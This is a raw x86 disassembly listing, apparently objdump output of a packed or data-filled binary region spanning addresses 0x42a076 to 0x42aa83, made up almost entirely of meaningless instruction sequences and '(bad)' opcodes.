  42a076:	jg     0x42a0ce
  42a078:	fadd   st,st(3)
  42a07a:	pop    esp
  42a07b:	add    ecx,DWORD PTR [ebp+0xd]
  42a07e:	sbb    BYTE PTR [esi+0xab6e5fb],cl
  42a084:	cmc    
  42a085:	sub    al,0x58
  42a088:	mov    eax,ds:0x606cba68
  42a08d:	inc    edx
  42a08e:	mov    bh,0x1
  42a090:	xor    DWORD PTR [eax],eax
	...
  42a0f2:	add    BYTE PTR [eax],al
  42a0f4:	xlat   BYTE PTR ds:[ebx]
  42a0f5:	pushf  
  42a0f6:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a0fd:	call   FWORD PTR [ebx]
  42a0ff:	(bad)  
  42a100:	mov    edx,0x789a1d03
  42a105:	ret    0x1
  42a108:	add    eax,0x9000001
  42a10d:	push   ds
  42a10e:	dec    edi
  42a10f:	jns    0x42a100
  42a111:	pop    es
  42a112:	repz sbb al,0x4a
  42a115:	xchg   edi,eax
  42a116:	pop    edx
  42a117:	xor    al,0x7b
  42a119:	lods   al,BYTE PTR ds:[esi]
  42a11a:	mov    eax,0xf610fdb2
  42a11f:	xor    al,al
  42a121:	inc    ecx
  42a122:	add    BYTE PTR [edi+eax*2+0x65],bh
  42a126:	test   eax,0xda98c321
  42a12b:	lods   eax,DWORD PTR ds:[esi]
  42a12c:	ss push ebx
  42a12e:	jmp    0x9843:0x6f3025bf
  42a135:	cmp    esp,DWORD PTR [ebx+0x56]
  42a138:	add    al,0x50
  42a13a:	sahf   
  42a13b:	aaa    
  42a13c:	int3   
  42a13d:	add    al,0xde
  42a13f:	fdivrp st(6),st
  42a141:	xor    edi,DWORD PTR [eax+ebx*4]
  42a144:	jmp    0x42a19f
  42a146:	inc    ebp
  42a147:	shr    BYTE PTR [ecx],0xe
  42a14a:	addr16 or dh,dl
  42a14d:	jmp    DWORD PTR [ebx]
  42a14f:	adc    bh,0x54
  42a152:	xchg   DWORD PTR ss:[edx-0x56],ebx
  42a156:	xchg   edx,eax
  42a157:	jle    0x42a0e6
  42a159:	mov    ch,0x92
  42a15b:	or     al,0x2
  42a15d:	ins    DWORD PTR es:[edi],dx
  42a15e:	push   ebx
  42a15f:	sbb    al,0x9a
  42a161:	loope  0x42a174
  42a163:	jl     0x42a183
  42a165:	pop    ds
  42a166:	mov    WORD PTR [edi],gs
  42a168:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a169:	fld    DWORD PTR [esi+0x54a2a426]
  42a16f:	addr16 or al,al
  42a172:	dec    esp
  42a173:	fdiv   QWORD PTR [ebx-0x5f9b62b0]
  42a179:	mov    edi,0x73614f85
  42a17e:	inc    ebp
  42a17f:	xor    ebx,DWORD PTR [esp-0x24]
  42a183:	in     al,dx
  42a184:	stos   BYTE PTR es:[edi],al
  42a185:	(bad)  
  42a186:	das    
  42a187:	mov    eax,ds:0x2694fb52
  42a18c:	push   ebx
  42a18d:	outs   dx,DWORD PTR ds:[esi]
  42a18e:	jl     0x42a209
  42a190:	fnsave [ebx+0x44]
  42a193:	loop   0x42a189
  42a195:	adc    al,0xad
  42a197:	and    eax,0xa5ec8802
  42a19c:	fs dec edx
  42a19e:	psrlw  mm3,QWORD PTR [esi-0xd8434b2]
  42a1a5:	or     BYTE PTR [eax],0xac
  42a1a8:	jo     0x42a1ed
  42a1aa:	or     edx,DWORD PTR [edx]
  42a1ac:	add    al,0xe
  42a1ae:	(bad)  
  42a1b0:	pop    edi
  42a1b1:	cdq    
  42a1b2:	scas   al,BYTE PTR es:[edi]
  42a1b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a1b4:	out    dx,al
  42a1b5:	sbb    DWORD PTR [ebp+0x77c1a417],ecx
  42a1bb:	sub    al,0xe1
  42a1bd:	arpl   WORD PTR [ebx],cx
  42a1bf:	js     0x42a1ce
  42a1c1:	pop    eax
  42a1c2:	push   ss
  42a1c3:	jnp    0x42a1be
  42a1c5:	fsubr  QWORD PTR gs:[ebx]
  42a1c8:	mov    ebx,0x12e5e82a
  42a1cd:	dec    edi
  42a1ce:	mov    ds,edi
  42a1d0:	jns    0x42a1e8
  42a1d2:	or     edx,ebp
  42a1d4:	dec    DWORD PTR [ecx]
  42a1d6:	sub    DWORD PTR [eax-0x61e79f16],0xbcfde89e
  42a1e0:	mov    ecx,0x12e6157c
  42a1e5:	outs   dx,BYTE PTR ds:[esi]
  42a1e6:	popa   
  42a1e7:	sub    al,0x7e
  42a1e9:	sbb    ch,dh
  42a1eb:	pop    edi
  42a1ec:	ja     0x42a181
  42a1ee:	ja     0x42a1da
  42a1f0:	test   DWORD PTR [eax+0x5],0x3b4341f8
  42a1f7:	pop    ecx
  42a1f8:	xlat   BYTE PTR ds:[ebx]
  42a1f9:	mov    esp,DWORD PTR [esi+edx*8-0x29787e81]
  42a200:	cmp    al,0x34
  42a202:	xchg   esp,eax
  42a203:	cmc    
  42a204:	sbb    bh,dh
  42a206:	or     DWORD PTR [edx],esp
  42a208:	pop    ecx
  42a209:	call   0xd396:0x97981d30
  42a210:	jns    0x42a212
	...
  42a272:	add    BYTE PTR [eax],al
  42a274:	sub    eax,DWORD PTR [ebp+0x19bf1995]
  42a27a:	scas   eax,DWORD PTR es:[edi]
  42a27b:	mov    bh,0x1a
  42a27d:	aas    
  42a27e:	scas   al,BYTE PTR es:[edi]
  42a27f:	fldenv [eax]
  42a281:	test   DWORD PTR [ecx+0x1c37d5d],0x10500
  42a28b:	add    BYTE PTR [edi],ch
  42a28d:	push   cs
  42a28e:	(bad)  
  42a28f:	das    
  42a290:	jb     0x42a2b0
  42a292:	out    0x3e,al
  42a294:	sub    al,0x17
  42a296:	stc    
  42a297:	stos   DWORD PTR es:[edi],eax
  42a298:	retf   
  42a299:	jo     0x42a276
  42a29b:	in     al,dx
  42a29c:	sbb    eax,0x6388146c
  42a2a1:	fstp   TBYTE PTR [edx-0x57]
  42a2a4:	sbb    al,0xb7
  42a2a6:	stos   BYTE PTR es:[edi],al
  42a2a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a2a8:	int    0x7
  42a2aa:	cli    
  42a2ab:	push   ss
  42a2ac:	arpl   WORD PTR [edi+0x342742fd],di
  42a2b2:	jecxz  0x42a2b5
  42a2b4:	adc    cl,ch
  42a2b6:	mov    dh,0xcb
  42a2b8:	mov    bh,0xda
  42a2ba:	lods   eax,DWORD PTR ds:[esi]
  42a2bb:	cvtdq2ps xmm1,xmm5
  42a2be:	inc    ebx
  42a2bf:	lahf   
  42a2c0:	mov    ecx,0xd5190930
  42a2c5:	stc    
  42a2c6:	or     ebp,DWORD PTR [esi+0x3]
  42a2c9:	and    esi,ebx
  42a2cb:	repnz mov es,WORD PTR [eax]
  42a2ce:	cmp    al,0x7c
  42a2d0:	mov    al,ds:0xd15bc7b5
  42a2d5:	ret    
  42a2d6:	jns    0x42a2d8
  42a2d8:	lock sub al,0x88
  42a2db:	lds    esp,FWORD PTR [esi+0xa53a647]
  42a2e1:	test   al,0x88
  42a2e3:	ja     0x42a27a
  42a2e5:	push   esp
  42a2e6:	pop    ds
  42a2e7:	adc    eax,0x73237ca5
  42a2ec:	push   ebx
  42a2ed:	dec    ebp
  42a2ee:	xchg   edi,eax
  42a2ef:	cmp    edx,ecx
  42a2f1:	loope  0x42a29c
  42a2f3:	daa    
  42a2f4:	aaa    
  42a2f5:	xor    eax,0x28478170
  42a2fa:	jle    0x42a309
  42a2fc:	mov    bl,al
  42a2fe:	dec    edi
  42a2ff:	mov    dl,0x5e
  42a301:	imul   ebx,DWORD PTR [ebp+0x18d92bb9],0x6633b17c
  42a30b:	clc    
  42a30c:	sar    DWORD PTR ds:0x16bdf31e,1
  42a312:	fiadd  WORD PTR [ecx-0x53]
  42a315:	std    
  42a316:	adc    ecx,DWORD PTR [ebp+0x65f26cb]
  42a31c:	cld    
  42a31d:	sub    BYTE PTR [edx+0x54],dh
  42a320:	ins    BYTE PTR es:[edi],dx
  42a321:	cs std 
  42a323:	dec    ebx
  42a324:	fcomp  DWORD PTR [edx]
  42a326:	mov    eax,0x27091bef
  42a32b:	dec    ecx
  42a32c:	dec    ecx
  42a32d:	inc    ebx
  42a32e:	push   0xffffffa6
  42a330:	mov    ebx,0xaa23bbe
  42a335:	pusha  
  42a336:	jb     0x42a2c9
  42a338:	in     al,0x65
  42a33a:	lds    edi,FWORD PTR [edx-0x58459a62]
  42a340:	test   cl,ah
  42a342:	rcr    ebx,cl
  42a344:	mov    bh,dl
  42a346:	pop    esi
  42a347:	rcr    BYTE PTR [edi+eiz*2-0x2c],cl
  42a34b:	jns    0x42a301
  42a34d:	push   ss
  42a34e:	test   DWORD PTR [edx-0x75],edi
  42a351:	jno    0x42a3a8
  42a353:	push   ebx
  42a354:	scas   eax,DWORD PTR es:[edi]
  42a355:	data16 clc 
  42a357:	fst    QWORD PTR [ebx]
  42a359:	mov    ebp,0x3eaa4d12
  42a35e:	jmp    0x42a353
  42a360:	sbb    al,cl
  42a362:	or     ecx,ebp
  42a364:	ja     0x42a334
  42a366:	xchg   edx,eax
  42a367:	aad    0xa3
  42a369:	push   ebx
  42a36a:	lock dec ecx
  42a36c:	pop    ecx
  42a36d:	inc    BYTE PTR [ecx+0x36e87de2]
  42a373:	or     bl,BYTE PTR [esi]
  42a375:	cmc    
  42a376:	xchg   ebp,eax
  42a377:	pushf  
  42a378:	lahf   
  42a379:	inc    ebp
  42a37a:	enter  0x7b9b,0xf5
  42a37e:	mov    esi,0xb083c123
  42a383:	fstp   QWORD PTR ds:0x12f98ccc
  42a389:	hlt    
  42a38a:	add    ah,BYTE PTR [edx-0x9cb6190]
  42a390:	xor    DWORD PTR [eax],eax
	...
  42a3f2:	add    BYTE PTR [eax],al
  42a3f4:	jg     0x42a404
  42a3f6:	jne    0x42a433
  42a3f8:	jne    0x42a475
  42a3fa:	jg     0x42a44a
  42a3fc:	loop   0x42a467
  42a3fe:	mov    ebp,0xb8c5633d
  42a403:	add    al,0x82
  42a405:	les    eax,FWORD PTR [ecx]
  42a407:	add    BYTE PTR ds:0x3d000001,al
  42a40d:	out    0x79,al
  42a40f:	and    esp,ecx
  42a411:	aam    0x1f
  42a413:	xor    BYTE PTR [esi-0x27c9d0e4],0x8a
  42a41a:	lea    ebp,[edx+0x5a]
  42a41d:	aaa    
  42a41e:	fcom   st(2)
  42a420:	shr    DWORD PTR [edx+0x1e],0xd8
  42a424:	sti    
  42a425:	mov    edi,0x87a319d0
  42a42a:	aad    0x2c
  42a42c:	cld    
  42a42d:	scas   al,BYTE PTR es:[edi]
  42a42e:	arpl   WORD PTR [edx-0x64e0f170],sp
  42a434:	(bad)  
  42a436:	inc    ecx
  42a437:	(bad)  
  42a439:	jbe    0x42a417
  42a43b:	fs push es
  42a43d:	adc    ebp,0x5155f582
  42a443:	dec    edx
  42a444:	xchg   ecx,eax
  42a445:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a446:	nop
  42a447:	mov    bl,0xe9
  42a449:	add    DWORD PTR [ecx+0x473b4ddf],edx
  42a44f:	lock inc eax
  42a451:	or     ebx,0xdd596e22
  42a457:	cli    
  42a458:	jmp    0x865a:0x60423f4
  42a45f:	out    0x3d,eax
  42a461:	push   0x62
  42a463:	pop    ebx
  42a464:	mov    bh,0xbf
  42a466:	push   esp
  42a467:	outs   dx,DWORD PTR ds:[esi]
  42a468:	sbb    BYTE PTR [esi+0xbd29b3d],bl
  42a46e:	loopne 0x42a447
  42a470:	not    edi
  42a472:	rcr    BYTE PTR [edi],cl
  42a474:	daa    
  42a475:	pop    esi
  42a476:	cmp    ch,BYTE PTR [eax]
  42a478:	xchg   edx,eax
  42a47a:	sub    al,BYTE PTR [eax]
  42a47c:	or     al,0xe9
  42a47f:	inc    edx
  42a480:	fucomip st,st(7)
  42a482:	xor    al,0xbf
  42a484:	xchg   ebp,eax
  42a485:	test   ah,0x37
  42a488:	sub    ebp,edx
  42a48a:	shr    DWORD PTR [ebx+0x6e],cl
  42a48d:	pushf  
  42a48e:	inc    ebp
  42a48f:	out    0x8d,eax
  42a491:	pop    edi
  42a492:	xchg   ebp,eax
  42a493:	hlt    
  42a494:	sbb    dl,dh
  42a496:	mov    ch,0x6f
  42a498:	jb     0x42a508
  42a49a:	inc    bx
  42a49c:	and    al,0xdc
  42a49e:	sbb    al,0x10
  42a4a0:	sub    BYTE PTR [esi+0x76],ch
  42a4a3:	jno    0x42a4e9
  42a4a5:	mov    ds:0x56f4c611,al
  42a4aa:	stc    
  42a4ab:	adc    ch,dh
  42a4ad:	cmp    ebp,DWORD PTR [eax+0x28]
  42a4b0:	mov    ch,0x9d
  42a4b2:	retf   0xecbf
  42a4b5:	jne    0x42a507
  42a4b7:	out    dx,eax
  42a4b8:	outs   dx,DWORD PTR ds:[esi]
  42a4b9:	jne    0x42a470
  42a4bb:	sbb    DWORD PTR [esi+ebp*4],esi
  42a4be:	sar    DWORD PTR [edx],1
  42a4c0:	imul   edx,edx,0xffffffc0
  42a4c3:	push   ecx
  42a4c4:	shl    DWORD PTR [edx],cl
  42a4c6:	retf   0x21a7
  42a4c9:	sbb    bh,BYTE PTR [esi+0x37300f82]
  42a4cf:	add    BYTE PTR [ebx+0x5c5894ce],0xbc
  42a4d6:	and    ah,al
  42a4d8:	mov    bh,0x96
  42a4da:	mov    ?,WORD PTR [ebp-0x6e]
  42a4dd:	cmp    BYTE PTR [edi],dl
  42a4df:	outs   dx,DWORD PTR ds:[esi]
  42a4e0:	cmc    
  42a4e1:	retf   0xff5
  42a4e4:	js     0x42a47b
  42a4e6:	dec    eax
  42a4e7:	out    0x5c,eax
  42a4e9:	ficom  DWORD PTR [edx-0x6140f8da]
  42a4ef:	cmp    al,0x28
  42a4f1:	push   ecx
  42a4f2:	shl    DWORD PTR [ecx+0x254eed5b],cl
  42a4f8:	dec    DWORD PTR [ebp+0x56]
  42a4fb:	ja     0x42a4b8
  42a4fd:	inc    ebx
  42a4fe:	and    al,0xb
  42a500:	mov    bl,0x4f
  42a502:	and    DWORD PTR [ebp+0x7b],0x80700b15
  42a509:	jge    0x42a57c
  42a50b:	and    DWORD PTR [ebx],esp
  42a50d:	mov    esi,0x9bb9ff
	...
  42a572:	add    BYTE PTR [eax],al
  42a574:	sbb    BYTE PTR [edi+0x17],cl
  42a577:	mov    ecx,0xefbef957
  42a57c:	(bad)  
  42a57d:	cmc    
  42a57e:	mov    edx,0xa511d29f
  42a583:	xchg   ecx,eax
  42a584:	xchg   ebp,eax
  42a586:	add    DWORD PTR [eax],eax
  42a588:	add    eax,0xfe000001
  42a58d:	retf   0x5d86
  42a590:	jnp    0x42a5a9
  42a592:	push   cs
  42a593:	fadd   QWORD PTR [ecx-0x514dc917]
  42a599:	cmp    eax,0x23faa200
  42a59e:	push   es
  42a59f:	popa   
  42a5a0:	or     BYTE PTR [ecx-0x44bd8167],ah
  42a5a6:	retf   0xeaa6
  42a5a9:	loopne 0x42a5b6
  42a5ab:	inc    edx
  42a5ac:	mov    dl,0x82
  42a5ae:	in     al,0x3
  42a5b0:	scas   eax,DWORD PTR es:[edi]
  42a5b1:	xor    BYTE PTR fs:[ebp-0x45],bh
  42a5b5:	dec    ecx
  42a5b6:	mov    ebp,0x49bf4dad
  42a5bb:	aad    0xba
  42a5bd:	xchg   esp,eax
  42a5be:	xor    al,dl
  42a5c0:	ins    BYTE PTR es:[edi],dx
  42a5c1:	idiv   bh
  42a5c3:	test   ch,bl
  42a5c5:	fild   WORD PTR [ebx-0x27]
  42a5c8:	jnp    0x42a5ba
  42a5ca:	add    ecx,DWORD PTR [ebx+edx*4-0x7b442654]
  42a5d1:	mov    eax,ds:0xbeee63cd
  42a5d6:	test   DWORD PTR gs:[edi-0xb0fb338],0x8b200670
  42a5e1:	shr    BYTE PTR [ecx+0x6d],0x12
  42a5e5:	mov    edi,0x6bdbb209
  42a5ea:	fist   DWORD PTR [esp+ebx*1]
  42a5ed:	hlt    
  42a5ee:	dec    esi
  42a5ef:	hlt    
  42a5f0:	mov    bh,BYTE PTR [edi-0x16e2a7f7]
  42a5f6:	sti    
  42a5f7:	mov    ch,0xb5
  42a5f9:	cmp    BYTE PTR [ecx],bl
  42a5fb:	(bad)  
  42a5fd:	mov    edx,ds
  42a5ff:	dec    ebp
  42a600:	jo     0x42a667
  42a602:	cmp    DWORD PTR [ecx],esi
  42a604:	ret    
  42a605:	push   eax
  42a606:	in     eax,0x52
  42a608:	aaa    
  42a609:	and    BYTE PTR ds:0x5c43a185,cl
  42a60f:	xchg   ecx,eax
  42a610:	mov    bh,0x19
  42a612:	cmc    
  42a613:	or     al,0x52
  42a615:	dec    esi
  42a616:	ds jb  0x42a5ab
  42a619:	clc    
  42a61a:	in     eax,dx
  42a61b:	daa    
  42a61c:	and    eax,edi
  42a61e:	mov    eax,0xb890b907
  42a623:	dec    ebx
  42a624:	and    esp,ebp
  42a626:	pop    edi
  42a627:	and    esi,DWORD PTR [ecx]
  42a629:	cmp    ah,BYTE PTR [eax-0x40]
  42a62c:	daa    
  42a62d:	mov    ch,0x2a
  42a62f:	ins    BYTE PTR es:[edi],dx
  42a630:	and    BYTE PTR [edi-0x1],0x1c
  42a634:	push   0x30fb32da
  42a639:	xor    ch,dh
  42a63b:	sahf   
  42a63c:	div    dl
  42a63e:	shl    al,0x1a
  42a641:	dec    esi
  42a642:	and    eax,0x92b522c
  42a647:	push   ebx
  42a648:	adc    ebp,ebx
  42a64a:	test   DWORD PTR [esi-0x3d],edx
  42a64d:	add    eax,0x8b22c69d
  42a652:	sub    edi,edx
  42a654:	(bad)  
  42a655:	ret    
  42a656:	fcomp  QWORD PTR [ebx+0x5f1c88]
  42a65c:	jl     0x42a691
  42a65e:	out    0xc,al
  42a660:	gs mov edi,0xd6a4aeca
  42a666:	sbb    al,0x32
  42a668:	mov    dh,0x93
  42a66a:	(bad)  
  42a66c:	nop
  42a66d:	outs   dx,DWORD PTR ds:[esi]
  42a66e:	adc    eax,0x97130370
  42a673:	or     bl,BYTE PTR [ebx]
  42a675:	popa   
  42a676:	xchg   edi,eax
  42a677:	cwde   
  42a678:	not    esp
  42a67a:	in     eax,dx
  42a67b:	jns    0x42a6ab
  42a67d:	fs jmp 0xd1db6553
  42a683:	or     eax,0x92f707c2
  42a688:	mov    bl,0x25
  42a68a:	into   
  42a68b:	in     al,dx
  42a68c:	cmp    BYTE PTR cs:[ecx+0x3d],dl
  42a690:	aam    0x0
	...
  42a6f2:	add    BYTE PTR [eax],al
  42a6f4:	and    al,0x16
  42a6f6:	outs   dx,BYTE PTR ds:[esi]
  42a6f7:	(bad)  
  42a6f8:	jle    0x42a6f9
  42a6fa:	lods   eax,DWORD PTR ds:[esi]
  42a6fb:	test   DWORD PTR [edi-0x7647ece4],0x8cbb0d85
  42a705:	mov    BYTE PTR [ecx],0x0
  42a708:	add    eax,0x92000001
  42a70d:	ret    0xd906
  42a710:	dec    esp
  42a711:	iret   
  42a712:	call   0xd1f3:0x3a51f24a
  42a719:	xor    dl,BYTE PTR [ebx+0x26f80292]
  42a71f:	push   eax
  42a720:	test   bl,ch
  42a722:	add    eax,0xd77a6200
  42a727:	sbb    BYTE PTR [ecx+edi*4-0x4c],cl
  42a72b:	sub    dl,BYTE PTR [edx+eiz*4]
  42a72e:	xchg   esp,eax
  42a72f:	nop
  42a730:	mov    ebp,0x1aea2532
  42a735:	mov    ebx,0xc84193ae
  42a73a:	jg     0x42a6c3
  42a73c:	mov    ds:0xc7e47951,al
  42a741:	out    0xc4,al
  42a743:	push   cs
  42a744:	push   ss
  42a745:	aas    
  42a746:	cwde   
  42a747:	test   BYTE PTR [ebx],0x82
  42a74a:	xchg   ecx,eax
  42a74b:	cmp    eax,0xb9436af
  42a750:	xor    eax,0x1ebe0eab
  42a755:	jmp    0xdda6:0x8077324
  42a75c:	mov    ch,0x38
  42a75e:	stc    
  42a75f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a760:	daa    
  42a761:	ja     0x42a7bd
  42a763:	bound  ebp,QWORD PTR [edx+0x71]
  42a766:	push   ebx
  42a767:	(bad)  
  42a768:	in     eax,dx
  42a769:	lods   al,BYTE PTR fs:[esi]
  42a76b:	aaa    
  42a76c:	mov    bh,0x5e
  42a76e:	popf   
  42a76f:	dec    eax
  42a770:	mov    bl,BYTE PTR [eax]
  42a772:	rcl    al,cl
  42a774:	data16 xor bl,ch
  42a777:	out    dx,al
  42a778:	jg     0x42a723
  42a77a:	es jp  0x42a7ea
  42a77d:	imul   esi,ebp,0x3164b935
  42a783:	xor    al,0x8a
  42a785:	mov    BYTE PTR [edi],ah
  42a787:	push   cs
  42a788:	loope  0x42a750
  42a78a:	sbb    esi,DWORD PTR [ebx]
  42a78c:	pop    ecx
  42a78d:	into   
  42a78e:	test   DWORD PTR [esi],ebx
  42a790:	arpl   WORD PTR [ebp-0x196a13d5],cx
  42a796:	jp     0x42a7c3
  42a798:	push   DWORD PTR [esi]
  42a79a:	mov    ebp,0x148b32d6
  42a79f:	ds test bh,bh
  42a7a2:	jg     0x42a7df
  42a7a4:	fidiv  DWORD PTR [esi-0x42793628]
  42a7aa:	mov    es,WORD PTR [edx]
  42a7ac:	xlat   BYTE PTR ds:[ebx]
  42a7ad:	mov    ds:0xf805ea76,al
  42a7b2:	add    esi,DWORD PTR [eax]
  42a7b4:	mov    esp,0xc057570e
  42a7b9:	mov    bh,BYTE PTR [ebp-0xd]
  42a7bc:	push   ebx
  42a7bd:	pop    eax
  42a7be:	pusha  
  42a7bf:	repz pop ebx
  42a7c1:	push   cs
  42a7c2:	mov    edi,0xf3adb7a4
  42a7c7:	fsub   DWORD PTR [ebx]
  42a7c9:	es call 0xbbbe88f2
  42a7cf:	std    
  42a7d0:	sbb    eax,0xb164eb61
  42a7d5:	push   ebp
  42a7d6:	pop    ecx
  42a7d7:	test   DWORD PTR [ebx-0x58d7bd8d],esi
  42a7dd:	out    0x7,eax
  42a7df:	aaa    
  42a7e0:	mov    BYTE PTR [edx],ah
  42a7e2:	aam    0x1c
  42a7e4:	aas    
  42a7e5:	shl    BYTE PTR [ecx],1
  42a7e7:	mov    dh,0xbe
  42a7e9:	mov    WORD PTR [ebx],ds
  42a7eb:	ja     0x42a832
  42a7ed:	pop    edx
  42a7ee:	sub    al,0x8
  42a7f0:	sar    DWORD PTR [eax],0x66
  42a7f3:	mov    bh,0xf9
  42a7f5:	enter  0x6881,0x65
  42a7f9:	push   edx
  42a7fa:	or     bl,dh
  42a7fc:	jb     0x42a81d
  42a7fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7ff:	imul   ebp,DWORD PTR [eax+0x31dc00dd],0x42
  42a806:	inc    edx
  42a807:	ja     0x42a7bd
  42a809:	ins    BYTE PTR es:[edi],dx
  42a80a:	fadd   QWORD PTR [ebp+0x1d]
  42a80d:	rcr    bl,1
  42a80f:	pop    ss
  42a810:	pop    ss
	...
  42a871:	add    BYTE PTR [eax],al
  42a873:	add    BYTE PTR [edx-0x10409c9b],cl
  42a879:	mov    edi,0xc58175de
  42a87e:	xchg   edi,eax
  42a87f:	ins    BYTE PTR es:[edi],dx
  42a880:	push   esp
  42a881:	div    BYTE PTR [eax]
  42a883:	aas    
  42a884:	xchg   ecx,eax
  42a885:	mov    DWORD PTR [ecx],0x10500
  42a88b:	add    BYTE PTR [ebx-0x22],dh
  42a88e:	repnz push 0xb7a3935
  42a894:	fldcw  WORD PTR [edi+0x46d5587e]
  42a89a:	mov    ebx,0xe1fd9b84
  42a89f:	dec    DWORD PTR [edx-0x426b3a01]
  42a8a5:	jp     0x42a8aa
  42a8a7:	call   0x92b211ab
  42a8ac:	test   al,0x44
  42a8ae:	mov    al,0xc1
  42a8b0:	mov    si,0xf6f8
  42a8b4:	push   es
  42a8b5:	fld    QWORD PTR [eax-0x49216e74]
  42a8bb:	test   eax,0x4c891740
  42a8c0:	enter  0x6510,0xd7
  42a8c4:	hlt    
  42a8c5:	mov    WORD PTR [ebp-0x40],es
  42a8c8:	add    eax,0x261dc38d
  42a8cd:	cmp    al,0xe6
  42a8cf:	stc    
  42a8d0:	inc    edx
  42a8d1:	es pop eax
  42a8d3:	cmp    al,0x30
  42a8d5:	xor    eax,DWORD PTR [ebp+edx*1+0x5957bf2a]
  42a8dc:	test   eax,0xa712c8e1
  42a8e1:	retf   
  42a8e2:	inc    esp
  42a8e3:	inc    ebx
  42a8e4:	stc    
  42a8e5:	stc    
  42a8e6:	xchg   ebx,eax
  42a8e7:	rcr    DWORD PTR [ecx+0x2a8c2ebb],1
  42a8ed:	stos   DWORD PTR es:[edi],eax
  42a8ee:	imul   edx,DWORD PTR [ecx],0x58
  42a8f1:	mov    edx,0x3ae6e3ef
  42a8f6:	cmp    BYTE PTR [ecx],dl
  42a8f8:	ins    DWORD PTR es:[edi],dx
  42a8f9:	mov    esp,DWORD PTR [eax-0x35df7c82]
  42a8ff:	sub    dh,ch
  42a901:	shl    DWORD PTR [eax+0x6fb9fbf],0x9b
  42a908:	jle    0x42a95c
  42a90a:	or     BYTE PTR [ebx-0x2e],0x46
  42a90e:	jmp    0x5382:0xdc6835e2
  42a915:	int    0xee
  42a917:	jecxz  0x42a924
  42a919:	loope  0x42a8ed
  42a91b:	sub    bh,BYTE PTR [edx]
  42a91d:	paddsw mm2,QWORD PTR [edx+0x3ece02a4]
  42a924:	ror    DWORD PTR [edi+edx*2],1
  42a927:	sub    BYTE PTR [edx+0x45],0xb8
  42a92b:	jg     0x42a8f8
  42a92d:	or     ah,BYTE PTR [ecx+0x32]
  42a930:	popa   
  42a931:	les    edx,FWORD PTR [eax+0x44d0d468]
  42a937:	jo     0x42a8e3
  42a939:	clc    
  42a93a:	pusha  
  42a93b:	push   es
  42a93c:	shl    DWORD PTR [ecx-0x71],0xff
  42a940:	mov    eax,fs
  42a942:	cwde   
  42a943:	adc    eax,0xe3ddfc58
  42a948:	push   esp
  42a949:	add    al,0x94
  42a94b:	pop    ds
  42a94c:	das    
  42a94d:	xchg   edi,eax
  42a94e:	ret    
  42a94f:	retf   
  42a950:	add    BYTE PTR [esp+ebp*4],bl
  42a953:	push   0xffffffce
  42a955:	cli    
  42a956:	pop    ss
  42a957:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a958:	rol    ah,0x7b
  42a95b:	lds    ebx,FWORD PTR [ecx+0x7]
  42a95e:	(bad)  
  42a95f:	add    ah,ah
  42a961:	idiv   bh
  42a963:	push   edi
  42a964:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a965:	shl    DWORD PTR [edx],1
  42a967:	int3   
  42a968:	addr16 int3 
  42a96a:	(bad)  [ecx-0x2af9e601]
  42a970:	xor    esi,ebx
  42a972:	lods   al,BYTE PTR ds:[esi]
  42a973:	cwde   
  42a974:	ror    esi,cl
  42a976:	repz push ebp
  42a978:	out    0x2d,al
  42a97a:	clc    
  42a97b:	out    dx,al
  42a97c:	es jno 0x42a9d3
  42a97f:	pop    DWORD PTR [eax-0x51]
  42a982:	push   ebp
  42a983:	cdq    
  42a984:	cmc    
  42a985:	mov    cl,0xa9
  42a987:	mov    bl,0x96
  42a989:	mov    eax,DWORD PTR [ecx+0x65]
  42a98c:	(bad)  
  42a98d:	loope  0x42a9c4
  42a98f:	cld    
  42a990:	mov    BYTE PTR [eax],0x0
	...
  42a9f3:	add    BYTE PTR [eax+0x3fee1d93],ch
  42a9f9:	out    dx,al
  42a9fa:	sti    
  42a9fb:	xlat   BYTE PTR ds:[ebx]
  42a9fc:	in     eax,0xd3
  42a9fe:	aad    0x7
  42aa00:	loop   0x42a998
  42aa02:	mov    ebp,esp
  42aa04:	xchg   esi,eax
  42aa05:	enter  0x1,0x5
  42aa09:	add    DWORD PTR [eax],eax
  42aa0b:	add    bh,ch
  42aa0d:	out    0x12,al
  42aa0f:	test   eax,0xe80ea987
  42aa14:	ins    BYTE PTR es:[edi],dx
  42aa15:	in     eax,dx
  42aa16:	ins    DWORD PTR es:[edi],dx
  42aa17:	outs   dx,BYTE PTR ds:[esi]
  42aa18:	push   0xfffffff2
  42aa1a:	pop    ebx
  42aa1b:	pop    ecx
  42aa1c:	push   ecx
  42aa1d:	add    bh,BYTE PTR [ecx-0x44ab3f38]
  42aa23:	add    eax,0xebb25705
  42aa28:	ret    0x8d5d
  42aa2b:	out    dx,eax
  42aa2c:	inc    edx
  42aa2d:	shl    DWORD PTR [ebp+0x1b],1
  42aa30:	mov    edx,0xb3fce1ec
  42aa35:	pop    ecx
  42aa36:	hlt    
  42aa37:	xlat   BYTE PTR ds:[ebx]
  42aa38:	iret   
  42aa39:	test   BYTE PTR [ebx+esi*8],bl
  42aa3c:	xchg   ebp,eax
  42aa3d:	fsubr  st(3),st
  42aa3f:	mov    ?,edi
  42aa41:	mov    bl,0x65
  42aa43:	push   edi
  42aa44:	mov    esp,0xb3e5fdfd
  42aa49:	mov    bl,0x31
  42aa4b:	jecxz  0x42aa7d
  42aa4d:	cs sti 
  42aa4f:	push   esi
  42aa50:	icebp  
  42aa51:	or     al,0x82
  42aa53:	icebp  
  42aa54:	ds addr16 bswap edi
  42aa58:	ret    
  42aa59:	mov    ecx,0x2bd005ec
  42aa5e:	push   ss
  42aa5f:	imul   eax,DWORD PTR [ebp-0xc84851e],0x46
  42aa66:	and    eax,0x3e110afb
  42aa6b:	add    ecx,DWORD PTR [ebx]
  42aa6d:	sbb    esp,ebx
  42aa6f:	call   0xf4b2:0x853d4c
  42aa76:	sti    
  42aa77:	iret   
  42aa78:	(bad)  
  42aa79:	out    dx,al
  42aa7a:	out    0x1b,al
  42aa7c:	mul    BYTE PTR [eax]
  42aa7e:	call   0xd8546189
  42aa83:	xchg   ebp,eax
